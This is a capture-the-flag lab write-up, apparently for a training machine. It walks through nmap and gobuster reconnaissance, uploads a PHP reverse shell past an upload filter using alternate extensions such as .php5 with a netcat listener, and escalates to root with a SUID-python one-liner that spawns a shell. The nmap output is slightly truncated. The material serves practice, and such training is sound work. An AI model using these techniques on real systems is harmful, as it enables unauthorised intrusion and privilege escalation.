## Reconnaissance

### Scan the machine, how many ports are open?

Let's start with a nmap scan
```bash
nmap 10.10.138.249
```
and then a detailed one to see the port service and version

```bash
nmap -sCV -p22,80 10.10.138.249
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

### What version of Apache is running?

In the Nmap scan, we see that we already have the answer to this
> Apache/2.4.29

### What service is running on port 22?

> ssh


### Find directories on the web server using the GoBuster tool.

Let's do a Gobuster scan
the syntax is:
```
gobuster [mode] -u [target ip] -w [wordlist]
```

```bash
gobuster dir -u 10.10.138.249 -w /usr/share/dirb/wordlists/common.txt
```

```
/css                  (Status: 301) [Size: 312] [--> http://10.10.138.249/css/]
/index.php            (Status: 200) [Size: 616]
/js                   (Status: 301) [Size: 311] [--> http://10.10.138.249/js/]
/panel                (Status: 301) [Size: 314] [--> http://10.10.138.249/panel/]
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://10.10.138.249/uploads/]
```

### What is the hidden directory?

We see two hidden directories, /panel and /uploads but the correct answer is

> /panel

which is a site to upload a file

## Getting a shell

So now that we have a file to upload a file, let's start trying to upload a php reverse shell that i suppose we can execute later going to the /uploads directory

I am going to use this:

https://github.com/pentestmonkey/php-reverse-shell

Remember to change the IP and PORT of your machine that you will use. And set up the listener with the port in your machine

```bash
nc -lvnp 1234
```

but we get a prompt that says php files are not allowed

Let's try to use another extension of php if this will bypass the extension filter

like these that I got from: https://book.hacktricks.xyz/pentesting-web/file-upload
PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module

and with the second extension, the file got uploaded!

now let's head over to the uploads directory and try to run it 

I wasn't running so I tried with a more popular extension: .php5 and it worked, now we have a shell, let's retrieve the user.txt flag

### user.txt

to find the flag, since I know what the name is I will search for it with the command find
```bash
find / -name user.txt 2>/dev/null
```
the way it works is 'find [directory to search] -name [name of the file] 2>/dev/null [this last part is to avoid printing errors]

we found it on /var/www/user.txt, lets use cat to read it

## Privilege Escalation

### Search for files with SUID permission, which file is weird?

to find this kind of file we can use the following command:
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
the one that stands out is this:

> /usr/bin/python

### Find a form to escalate your privileges.

let's head over to _gtfobin_ to search an exploit for this SUID FILE

we got this
```bash
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
remember to change ./python to the actual directory path that we found
```bash
./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

and with this, we got a root shell

### root.txt
I head over /root and there it is, the root.txt flag
